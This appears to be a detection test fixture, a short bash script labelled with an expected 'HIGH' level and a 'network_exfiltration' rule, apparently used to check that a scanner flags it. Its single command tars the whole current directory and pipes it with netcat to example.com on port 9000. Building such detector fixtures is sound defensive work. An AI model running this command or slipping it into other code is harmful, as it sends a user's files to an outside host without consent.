#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: network_exfiltration
tar czf - . | nc example.com 9000
